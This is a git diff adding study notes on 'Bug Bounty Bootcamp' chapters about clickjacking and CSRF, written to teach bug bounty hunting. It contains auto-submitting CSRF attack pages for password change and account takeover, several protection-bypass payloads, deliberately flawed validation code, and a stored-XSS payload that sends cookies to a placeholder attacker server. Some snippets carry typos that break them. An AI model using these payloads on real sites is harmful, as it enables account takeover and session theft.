@@ -12,6 +12,8 @@
   - [Writing Your Own Recon Scripts](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#writing-your-own-recon-scripts)
 - [Chapter 6: Cross-Site Scripting](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#cross-site-scripting)
 - [Chapter 7: Open Redirects](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-7-open-redirects)
+- [Chapter 8: ClickJacking](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-8-clickjacking)
+- [Chapter 9: Cross-Site Request Forgery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-9-cross-site-request-forgery)
 
 ### Chapter 1: Picking a Bug Bounty Program
 
@@ -1500,5 +1502,527 @@ _Combining Exploit Techniques_
 3. Test the pages and parameters you've found for open redirects.
 4. If the server blocks the open redirect, try the protection bypass techniques mentioned in this chapter.
 5. Brainstorm ways of using the open redirect in your other bug chains!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 8: ClickJacking
+
+"_Clickjacking_, or user-interface redressing, is an attack that tricks users into clicking a malicious button that has been made to look legitimate. Attackers achieve this by using HTML page-overlay techniques to hide one webpage within another..."
+
+- Clickjacking is rarely considered in scope for bug bounty programs, but not always - if you can demonstrate the impact of the clickjacking vulnerability AND it's not listed as out of scope.
+
+I'm going to leave this out for now. If you're interested in learning more about clickjacking, buy the book, it's good!
+
+### Chapter 9: Cross-Site Request Forgery
+
+"_Cross-site request forgery_ (CSRF) is a client-side technique used to attack other users of a web application. Using CSRF, attackers can send HTTP request that pretend to come from the victim, carrying out unwanted actions on a victim's behalf. For example, an attacker could change your password or transfer money from your bank account without your permission. CSRF attacks specifically target state-changing rquests, like sending tweets and modifying user settings, instead of request that reveal sensitive user info. This is because attackers won't be able to read the response to the forged request sent during a CSRF attack."
+
+**Mechanisms**
+
+- Most modern web apps authenticate users and manage user sessions using session cookies.
+  - When you login, the web app sends your browser a session cookie and this cookie is used to prove your identity to the server.
+- When you login the server sends your browser the session cookie via an HTTP response header called `Set-Cookie`
+  - ex: `Set-Cookie: session_cookie=YOUR_SESSION_COOKIE;`
+  - Your browser receives, stores, and then sends the session cookie via the `Cookie` HTTP request header in every request: `Cookie: session_cookie:YOUR_SESSION_COOKIE;`
+  - The cookie acts as a constant authentication check to perform all requests that would require the user to be authenticated (change passwords, make posts, etc.).
+- Below is an example of CSRF vulnerable HTML:
+
+```
+<html>
+  <h1>Send a tweet.</h1>
+  <form method="POST" action="https://twitter.com/send_a_tweet">
+    <input type="text" name="tweet_content" value="Hello world!">
+    <input type="submit" value="Submit">
+  </form>
+</html>
+```
+
+- Breakdown:
+  - `<h1>` tag denotes a first-level HTML heading.
+  - `<form>` tag defines the beginning and end of an HTML form.
+    - `POST` method attribute means the form will perform a POST request.
+    - `action` attribute tells the POST attribute where to send the post request.
+    - `<input>` tags specify an input field where users can enter data.
+      - The first is a "text" input tag named "tweet_content" and the value (or what the user input) is "Hello World."
+      - The second is an input button that will "Submit" the user input.
+- The Post request for this would look something like this:
+
+  ```
+  POST /send_a_tweet
+  Host: twitter.com
+  Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE
+
+  (POST request body)
+  tweet_content="Hello world!"
+  ```
+
+- The vulnerability is that any site, not just Twitter, can initiate the request.
+  - If you hosted this HTML on your own site and your site then posts to twitter, your browser will automatically include your Twitter session cookies in requests to Twitter.
+- Here's a more realistic malicious CSRF page:
+
+  ```
+  <html>
+    <iframe style+"display:none" name="csrf-frame">
+      <form method="POST" action="https://twitter.com/send_a_tweet"
+      target="csrf-frame" id="csrf-form">
+        <input type="text" name="tweet_content" value="Follow @vickieli7 on twitter!">
+        <input type='submit' value="Submit">
+      </form>
+    </iframe>
+
+    <script>document.getElementById("csrf-form").submit();</script>
+  </html>
+  ```
+
+  - An `<iframe>` is an HTML element that embeds another document within the current HTML document, and it's invisible to the user when the style is set to `display:none`.
+    - The JavaScript `<script>` tag then submits the form with the ID _csrf-form_
+    - The code fetches the HTML form by referring to it by it's ID (_csrf-form_).
+  - This attack page will force any victim who visits the malicious site to tweet.
+    - Think nefarious advertising campaign, or spreading malicious links through users who visit the page.
+
+- The impact of a CSRF is largely dependent on where the CSRF vulnerability is found.
+  - If you find a CSRF on a request to change password, you could take over user accounts.
+  - If you find a CSRF on a empty shopping cart request, you may only be able to annoy users.
+  - CSRFs in functionalities like account balance transfers would be very significant for obvious reasons.
+  - You can also use CSRFs to trigger injection vulnerabilities like XSS and command injections.
+
+**Prevention**
+
+- Use _CSRF tokens_
+  - These can be embedded into every form on a website and browsers will send this string along withe very state-changing request.
+  - The website then validates the token to make sure the request came from their website.
+  - These are random and unpredictable strings (high entropy)
+  - CSRF tokens must be unique for each sessions and HTML form.
+- Example:
+
+  ```
+  <form method="POST" action="https://twitter.com/send_a_tweet">
+    <input type="text" name="tweet_content" value="Hello world!">
+    <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b">
+    <input type="submit" value="Submit">
+  </form>
+  ```
+
+  - This results in the follow POST request:
+
+  ```
+  POST /send_a_tweet
+  Host: twitter.com
+  Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE
+
+  (POST request body)
+  tweet_content="hello world!"&871caef0757a4ac9691aceb9aad8b65b
+  ```
+
+- Many frameworks have CSRF tokens build in, so you can use your frameworks implementation (Joomla, Spring, Struts, Ruby on Rails, .NET).
+- You can also use `SameSite` cookies with the `Set-Cookie` header by using the `SameSite` flag set to `Strict`.
+  `Set-Cookie: PHPSESSID=UEhQUOVTUO1E; Max-Age=86400; Secure; HttpOnly; SameSite=Strict`
+  - `SameSite` flag can also be set to `Lax`, which tells the client's browser to send a cookie only in requests that cause top-level navigation (when users actively click a link and navigate to the site).
+    - Ensures that users have access to the resources on your site if the cross-site request is intentional.
+    - If you login to a web app from a 3rd-party site, the login will be sent. But if the 3rd-party tries to send a POST request to the web app, or tries to embed the contents of the web app within an iframe, cookies won't be sent:
+      `Set-Cookie: PHPSESSID=UEhQUOVTUO1E; Max-Age=86400; Secure; HttpOnly; SameSite=Lax`
+  - SameSite=Lax and Samesite=Strict prevent browsers from sending cookies on POST or AJAX requests and within iframes and image tags.
+- Some browsers set their default cookie settings to `SameSite=Lax` so that even if a web application isn't using the `SameSite` flag, your browser will still protect you against.
+  - In 2024, Firefox still doesn't have this enabled by default. To enable:
+    - Navigate to `about:config`
+    - In the search bar: `network.cookie.sameSite.laxByDefault` and click the swap arrows on the right to set to True.
+- You may still be able to conduct a CSRF attack even if a browser or web app is using `SameSite=Lax` as default if the site allows state-changing request with the GET HTTP method.
+  - ex link: `https://email.example.com/password_change?new_password=adc123` if the password change is conducted with a GET request.
+  - Because this link will cause top-level navigation, the user's session cookies with be included in the GET request and the CSRF attack will succeed.
+    ```
+    GET /password_change?new_password=adc123
+    Host: email.example.com
+    Cookie: session_cookie=YOUR_SESSION_COOKIE
+    ```
+- "When websites don't implement `SameSite` cookies or other CSRF protection from every state-changing request, the request becomes vulnerable to CSRF if the user is not using a `SameSite-by-default browser`. CSRF protection is still the responsibility of the website despite the adoption of `SameSite-by-default`."
+
+**Hunting for CSRFs**
+"CSRFs are common and easy to exploit. To look for them, start by discovering state-changing requests that aren't shielded by CSRF protections."
+
+Step 1: Spot State-Changing Actions
+
+- Change password: _email.example.com/password_change_
+  POST request
+
+  Request parameters: _new_password_
+
+- Send email: _email.example.com/send_email_
+  POST request
+
+  Request parameters:_draft_id, recipient_id_
+
+- Delete email:\*email.example.com/delete_email
+  Post request
+
+  Request parameters:_email_id_
+
+Step 2: Look for a Lack of CSRF Protections
+
+- Visit the endpoints you found in Step 1 running a proxy like BurpSuite in the background and start intercepting all the requests you can generate (send an email, delete an email, change a password, etc.).
+- Check the requests you've sent in your proxy to see if their vulnerable (look at the request sent for changing a password, deleting an email, etc.)
+- Search the requests using the search bar at the bottom of Burp for things like "csrf" or "state"
+  - These CSRF protections may show up in request headers, cookies, and URL parameters.
+  - Even if you find CSRF protections on an endpoint, you could still be able to bypass them.
+
+Step 3: Confirm the Vulnerability
+
+- Test the potentially vulnerable CSRF endpoints by crafting an HTML page like this (Make sure to end the file in .html so it loads into your browser):
+
+  ```
+  <html>
+    <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
+      <input type="text" name="new_password" value="abc123">
+      <input type="submit" value="Submit">
+    </form>
+    <script>document.getElementById("CSRF-form").submit();</script>
+  </html>
+  ```
+
+  - Open the HTML page in your browser that is signed into your target site. This form will generate a request like this:
+
+  ```
+  POST /password_change
+  Host: email.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+
+  (POST request body)
+  new_password=adc123
+  ```
+
+  - Check if your password on email.example.com has been changed to abc123.
+    - The goal to to prove that a foreign site can carry out state-changing actions on a user's behalf.
+
+- Websites without CSRF tokens can still protect against CSRF attacks by checking that the referer header of the request matches a legitimate URL.
+  - This helps by filtering out requests that have originate from foreign sites.
+  - Referer headers can be manipulated by attackers and aren't a foolproof mitigation solution.
+- Combine CSRF tokens and `SameSite` session cookies for the best protection.
+
+**Bypassing CSRF Protection**
+
+- Modern websites are becoming more secure and most of them have some form of CSRF protection. You still may be able to exploit a website that has CSRF protections by modifying your payloads.
+
+_Change the Request Method_
+
+- If sites accept multiple request methods for the same endpoint and the CSRF protections are only in place for one method, your attack may succeed.
+  - ex: The following POST request is protected from CSRF attacks.
+  ```
+  POST /password_change
+  Host: email.example.com
+  Cookie: sessions_cookie=YOUR_SESSION_COOKIE
+  ```
+  - The same request with a GET method may work:
+  ```
+  GET /password_change?new_password=abc123
+  Host: email.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+  ```
+  - So a malicious page could looke like this:
+  ```
+  <html>
+    <img src="https://email.example.com/password_change?new_password=abc123"/>
+  </html>
+  ```
+  - The HTML tag `<img>` loads an image from an external source and will send a GET request to the URL specified in its `src` attribute.
+    - Check to see if the password has changed after your load the HTML page and if it does, the website is vulnerable to CSRF.
+  - You can swap the other way too, from GET to POST.
+
+_Bypass CSRF Tokens Stored on the Server_
+
+- "If the site isn't validating CSRF tokens in the right way, you can still achieve CSRF with a few modification of your malicious HTML page."
+- Test if deleting the token parameter or sending a blank token parameter will work. Below is a POST request with a CSRF token:
+
+  ```
+  POST /password_change
+  Host: email.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+
+  (POST request body)
+  new_password=adc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
+  ```
+
+  - You can change the last line containing the csrf_token to be either:
+    `new_password=abc123` or,
+    `new_password=abc123&csrf_token=`
+  - The HTML form for these would look like the following, respectively:
+
+  ```
+  <html>
+    <form method="POST" action="https://email.example.com/password_change" ud="csrd-form">
+      <input type="text" name="new_password" value="abc123">
+      <input type='submit' value="submit">
+    </form>
+    <script>document.getElementById("CSRF-form").submit();</script>
+  </html>
+  ```
+
+  and:
+
+  ```
+    <html>
+    <form method="POST" action="https://email.example.com/password_change" ud="csrd-form">
+      <input type="text" name="new_password" value="abc123">
+      <input type="text" name="csrf_token" value="">
+      <input type='submit' value="submit">
+    </form>
+    <script>document.getElementById("CSRF-form").submit();</script>
+  </html>
+  ```
+
+  - These types of bypass can often work because applications often only validate the token _if_ the token exists, or if the token parameter isn't blank.
+  - The following is a code example of insecure csrf token validation:
+
+  ```
+  def validate_token():
+    if (request.csrf_token == session.csrf_token):
+      pass
+    else:
+      throw_error("CSRF token incorrect. Request rejected.")
+  [...]
+
+  def process_state_changing_action():
+    if request.csrf_token:
+      validate_token()
+    execute_action()
+  ```
+
+  - This python code checks to see if a CSRF token exists with `if request.csrf_token`, if it exists, it validates the token and the code continues.
+    - You can see how if the token doesn't exist the code will skip validation and proceed to run.
+
+- You can also try submitting the request with another session's CSRF token.
+
+  - This works if the application checks that a csrf-token is valid, but does not check whether it belongs to the current user.
+  - You would then use another users account or ID, and use your csrf-token in place of theirs. If it's vulnerable, you can change any users password by using your token.
+  - Vulnerable code may look like this:
+
+  ```
+  def validate_token()
+    if request.csrf_token:
+      if (request.csrf_token is valid_csrf_tokens):
+        pass
+      else:
+        throw_error("CSRF token incorrect. Request rejected.")
+
+  [...]
+
+  def process_state_changing_action():
+    validate_token()
+    execute_action()
+  ```
+
+  - This checks if the token exists in the list of valid tokens with `if (request.csrf_token in valid_csrf_tokens):` and if it does, the execution continues.
+    - You can see that so long as you're using a token that exists, you can execute the action.
+
+_Bypass Double-Submit CSRF Tokens_
+
+- Sites can also use _double-submit cookies_ to defend against CSRF and in so the state-changing request contains the same random token as both a cookie and a request parameter.
+
+  - The server checks whether the two values are equal, if the values match, the request is seen as legitimate, otherwise the application rejects it.
+  - ex. valid request:
+
+  ```
+  POST /password_change
+  Host: email.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b
+
+  (POST request body)
+  new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
+  ```
+
+  - The server only checks whether the token in the cookies is the same as the token in the request parameters, it does not check whether the tokens themselves are valid.
+  - "If the application uses double-submit cookies as its CSRF defence mechanism, it's probably not keeping records of the valid token server-side. If the server were keeping records of the CSRF token server-side, it could simply validate the token when it was sent over, and the application would not need to use double-submit cookies in the first place."
+    - You could set the `csrf_token=not_a_real_token` and if both the request parameter token and the cookie token are the same, it will work with double-submit.
+  - To execute a double-submit CSRF token attack, you will need to know about _Session fixation_, which is an attack that allows attackers to select the session cookies of the victim. Learn more about _Session Fixation_ [here](https://en.wikipedia.org/wiki/Session_fixation).
+
+_Bypass CSRF Referer Header Check_
+
+- If the website is verifying that the referer header sent with the state-changing request is a part of the website's allowlisted domains, it will perform this verification and either reject or execute the request based only on the referer header.
+- Start by removing the referer header. To do this add a `<meta>` tag to the page hosting your request form:
+
+  ```
+  <html>
+    <meta name="referrer" content="no-referrer">
+    <form method="POST" action="https://email.com/password_change" id="csrf-form">
+      <input type="text" name="new_password" value="abc123">
+      <input type='submit' value="Submit">
+    </form>
+    <script>document.getElementById("CSRF-form").submit();</script>
+  </html>
+  ```
+
+  - This tells the browser not to include a referer header in the resulting HTTP request.
+  - The faulty application logic might look like this:
+
+  ```
+  def validate_referer():
+    if (request.referer in allowlisted_domains):
+      pass
+    else:
+      throw_error("Referer incorrect. Request rejected.")
+
+  [...]
+
+  def process_state_changing_action():
+    if request.referer:
+      validate_referer()
+    execute_action()
+  ```
+
+  - Similar to earlier examples, this application only validates the referer header if it exists. By making the victim's browser omit the referer header, you bypass this CSRF protection.
+
+- You may also be able to bypass the logic check used to validate the referer URL if the application looks for the string "example.com" in the referer URL.
+
+  - The logic would look something like this:
+
+  ```
+  def validate_referer():
+    if request.referer:
+      if ("example.com" in request.referer):
+        pass
+      else:
+        throw_error("Referer incorrect. Request rejected.")
+
+  [...]
+
+  def process_state_changing_action():
+    validate_referer()
+    execute_action()
+  ```
+
+  - The logic can be exploited by creating a subdomain named after the victim's domain, then hosting a malicious HTML on that subdomain. The request looks like:
+
+  ```
+  POST /password_change
+  Host: email.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+  Referer: example.com.attacker.com
+
+  (POST request body)
+  new_password=abc123
+  ```
+
+  - Alternatively, you could place the victim domain name as a pathname:
+
+  ```
+  POST /password_change
+  Host: email.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+  Referer: attacker.com/example.com
+
+  (POST request body)
+  new_password=abc123
+
+  ```
+
+  - After you've uploaded your HTML page at the correct location, load that page and see if the state-changing action was executed.
+
+_Bypass CSRF Protection by Using XSS_
+
+- "Any XSS vulnerablity will defeat CRSF protection, because XSS will allow attackers to steal the legitimate CSRF token and then craft forged requests by using CMLHttpRequest. Often, attackers will find XSS as the starting point to launch CSRFs to take over admin accounts."
+
+**Escalating the Attack**
+
+"After you've found a CSRF vulnerablity, don't just report it right away! Here are a few ways you can escalate CSRFs into severe security issues to maximize the impact of your report. Often, you need to use a combination of CSRF and other minor design flaws to discover these."
+
+_Leak User Information by Using CSRF_
+
+- ex. example.com sends monthly billing reports to users register email address. These emails could contain billing information, street addresses, phone numbers, credit card info, etc.
+  - By changing a users email address to one you choose, you could have this information sent to you instead.
+  - To do this, you'll want to look for something like a `POST /change_billing_email` endpoint.
+
+_Create Stored Self-XSS by Using CSRF_
+
+- Self-XSS are usually considered non-issues because they require so much action from the victim to succeed and so are too difficult to exploit.
+- Combining CSRF with self-XSS can turn self-XSS into stored XSS - the money maker!
+- ex. finance.example.com allows users to create nicknames for their linked bank accounts, and this endpoint is vulnerable to self-XSS because there is no sanitization, validation, or escaping for user input on the field. Only the user can edit and see this field, so there is no way for an attacker to trigger the XSS directly.
+
+  - If this endpoint is vulnerable to CSRF, say, because omitting the token parameter in the request will bypass CSRF protection, the following request could work:
+
+  ```
+  POST /change_account_nickname
+  Host: finance.example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+
+  (POST request body)
+  account=0
+  &nickname="<script>document.location='http://attacker_server_ip/
+  cookie_stealer.php?c='+document.cookie;</script>"
+  ```
+
+  - This request will change the user's account nickname and store the XSS payload there. The next time a user logs into the account and views their dashboard, they'll trigger the XSS.
+
+_Take Over User Accounts by Using CSRF_
+
+- Taking over accounts via CSRF isn't that uncommon. All you need is a CSRF vulnerability in a critical functionality like password creation, password changes, changing email addresses, resetting passwords.
+- A good place to look for this is on site that allow users to sign up using social media accounts which means they won't need to set a password. These sites will also often give users who've signed up via social media accounts the option of setting a password via a request similar to:
+
+  ```
+  POST /set_password
+  Host: example.com
+  Cookie: session_cookie=YOUR_SESSION_COOKIE
+
+  (POST request body)
+  password=XXXXX&csrf_token=871caef0757a4ac9691aceb9aad8b65b
+  ```
+
+  - Because they originally signed up via social media, there is no "old password" to set the new password.
+  - If the endpoint is vulnerable to CSRF, all an attacker has to do is post a link to this HTML page somewhere that the user of the site might frequent, and they can automatically assign the password of any user who visists the malicious page:
+
+  ```
+  <html>
+    <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
+      <input type="text" name="new_password" value="this_account_is_now_mine">
+      <input type="text" name="csrf_token" value="">
+      <input type='submit' value="Submit">
+    </form>
+    <script>document.getElementById("csrf-form").submit():</script>
+  </html>
+  ```
+
+**Delivering the CSRF Payload**
+
+1. The easiest way to deliver a payload is to trick users into visiting a malicious link by posting them on forums or social media platforms:
+   "Visit this page to get a discount on your example.com subscription:
+   https://example.attacker.com"
+
+- The attacker then host an auto-submitting form to execute the CSRF:
+
+```
+<html>
+  <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
+    <input type="text" name="new_password" value="this_account_is_now_mine">
+    <input type='submit' value="Submit">
+  </form>
+  <script>document.getElementById("csrf-form").submit();</script>
+</html>
+```
+
+2. CSRFs that can be executed through a GET request can embed the request as an image directly through an image posted to a forum. So anyone who views the forum page would be affected:
+   `<img src="https://email.example.com/set_password>new_password=this_account_is_now_mine">`
+
+3. Attackers can deliver a CSRF payload to a large number of users by exploiting stored XSS. If a forum comment field if vulnerable to stored XSS the payload can be delivered to all visitors who visit the forum:
+
+```
+<script>
+  document.body.innerHTML += "
+    <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
+      <input type="text" name="new_password" value"this_account_is_now_mine">
+      <input type='submit' value="Submit">
+    </form>;
+  document.getElementById("csrf-form").submit();
+</script>
+```
+
+**Finding Your First CSRF!**
+
+1. Spot the state-changing actions on the application and keep a ntoe on their locations and functionality.
+2. Check these functionalities for CSRF protection. If you can't spot any protections, you might have found a vulnerability!
+3. If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques mentioned in this chapter.
+4. Confirm the vulnerability by crafting a malicious HTML page and visisting that page to see if the action was executed.
+5. Think of strategies for delivering your payload to end users.
+6. Draft your first CSRF report!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 10: Insecure Direct Object References
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
